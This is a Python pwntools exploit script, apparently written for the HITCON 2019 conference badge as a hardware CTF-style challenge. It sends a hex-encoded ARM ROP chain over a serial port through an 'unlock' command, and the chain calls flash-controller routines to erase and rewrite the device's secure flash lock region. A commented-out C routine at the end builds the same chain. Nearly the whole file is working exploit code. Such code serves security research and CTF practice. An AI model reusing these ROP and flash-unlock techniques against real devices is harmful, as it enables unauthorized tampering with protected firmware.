#!/usr/bin/env python
from pwn import *
import serial , re

context.arch = 'arm'

s = serial.Serial( '/dev/tty.usbmodem14101' )


def readuntil( n ):
    buf = ''
    while True:
        c = s.read()
        buf += c
        if n in buf:
            return buf

prompt = 'HitconBadge2019 >> '

def shell( cmd ):
    s.write( cmd + '\r' )
    o = readuntil( prompt )
    #print o
    return o

def interactive():
    while True:
        try:
            cmd = raw_input().strip()
            if cmd == 'exit':
                break
            shell( cmd )
        except KeyboardInterrupt:
            break

def checksum( p ):
    r = 0
    for c in map( ord , p ):
        r ^= c
    return chr( r )


secure_stack = 0x20003000

fmc_open = 0x1c95
fmc_write = 0x1ce9
fmc_erase = 0x1c11

pop_r7_pc = 0x2e0 + 1 # pop {r7, pc}
pop_r0_r1_pc = 0x44b4 + 1 # pop {r0, r1, pc}
pop_r0_r1_r2_r3_r4_pc = 0x4436 + 1 # pop {r0, r1, r2, r3, r4, pc}
orrs_r0_r2_pop_r4_r5_pc = 0xc7f6 + 1 # orrs r0, r2 ; pop {r4, r5, pc}
mov_lr_r3_bx_lr = 0xf718 + 1 # mov lr, r3 ; bx lr
store = 0xc9a4 + 1 # str r0, [r3] ; movs r0, r7 ; add sp, #0xc ; pop {r4, r5, r6, r7, pc}
load = 0x6e6e + 1; # ldr r0, [r3] ; bx lr

p = flat(
    pop_r0_r1_r2_r3_r4_pc,
    0, 1, 2, pop_r7_pc, 4,
    mov_lr_r3_bx_lr,
    0x7,

    pop_r7_pc,
    0x7,
    fmc_open,
    0x7,

    pop_r0_r1_r2_r3_r4_pc,
    0,
    1,
    8, # r2
    0x4000c000, # r3
    4,
    load, # ldr r0, [r3] ; bx lr
    0x7,

    orrs_r0_r2_pop_r4_r5_pc,
    4, 5,
    store, # str r0, [r3] ; movs r0, r7 ; add sp, #0xc ; pop {r4, r5, r6, r7, pc}
    0, 0, 0, 4, 5, 6, 7,

    pop_r0_r1_pc,
    0x40000 - 0x800, # locks secure flash address
    0,
    fmc_erase,
    0x7,

    pop_r0_r1_pc,
    0x40000 - 0x800,
    0xf7ffffff,
    fmc_write,
    0x7,

    pop_r0_r1_pc,
    0x40000 - 0x800 + 0x100,
    0xfaceb00c,
    fmc_write
)

print hex( len( p ) )

p = p32( 0x80000000 ) + checksum( p ) + checksum( p ) * 0x64 + p
p = p.encode( 'hex' ) + 'yuawn'

print hex( len( p ) )

shell( 'unlock ' + p )

interactive()


'''
void _rop( int argc, char **argv ){

    uint32_t rop[0x30];

    uint32_t secure_stack = 0x20003000;

    uint32_t fmc_open = 0x19a1 , fmc_write = 0x19f5 , fmc_erase = 0x191d;

    uint32_t pop_r7_pc = 0x2e0 + 1;
    uint32_t pop_r0_r1_pc = 0x2340 + 1;
    uint32_t pop_r0_r1_r2_r3_r4_pc = 0x33ba + 1;
    uint32_t orrs_r0_r2_pop_r4_r5_pc = 0x8fde + 1;
    uint32_t gadget1 = 0x918c + 1; // str r0, [r3] ; movs r0, r7 ; add sp, #0xc ; pop {r4, r5, r6, r7, pc}
    uint32_t gadget2 = 0x3656 + 1; // ldr r0, [r3] ; bx lr

    int i = 0;

    rop[i++] = 0x61616161;
    rop[i++] = 0x61616161;
    rop[i++] = 0x61616161;
    rop[i++] = 0x61616161;
    rop[i++] = 0x61616161;

    /*
    rop[i++] = pop_r7_pc;
    rop[i++] = secure_stack;
    rop[i++] = fmc_open;
    rop[i++] = secure_stack;

    rop[i++] = pop_r0_r1_pc;
    rop[i++] = 0x7fffffff;
    rop[i++] = 0x7777777;
    rop[i++] = 0x722 + 1;
    */


    rop[i++] = pop_r7_pc;
    rop[i++] = 0x7;
    rop[i++] = fmc_open;
    rop[i++] = 0x7;

    rop[i++] = pop_r0_r1_r2_r3_r4_pc;
    rop[i++] = 0;
    rop[i++] = 1;
    rop[i++] = 8;
    rop[i++] = 0x4000c000;
    rop[i++] = 4;
    rop[i++] = gadget2; // ldr r0, [r3] ; bx lr
    rop[i++] = 0x7;

    rop[i++] = orrs_r0_r2_pop_r4_r5_pc;
    rop[i++] = 4;
    rop[i++] = 5;
    rop[i++] = gadget1; // str r0, [r3] ; movs r0, r7 ; add sp, #0xc ; pop {r4, r5, r6, r7, pc}

    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = 4;
    rop[i++] = 5;
    rop[i++] = 6;
    rop[i++] = 7;

    rop[i++] = pop_r0_r1_pc;
    rop[i++] = 0x40000 - 0x800;
    rop[i++] = 0x7fffffff;
    rop[i++] = fmc_erase; // pop_r7_pc
    rop[i++] = 0x7;

    rop[i++] = pop_r0_r1_pc;
    rop[i++] = 0x40000 - 0x800;
    rop[i++] = 0x7fffffff;
    rop[i++] = fmc_write; // pop_r7_pc
    rop[i++] = 0x7;


    nsc_rop( rop );

}
'''
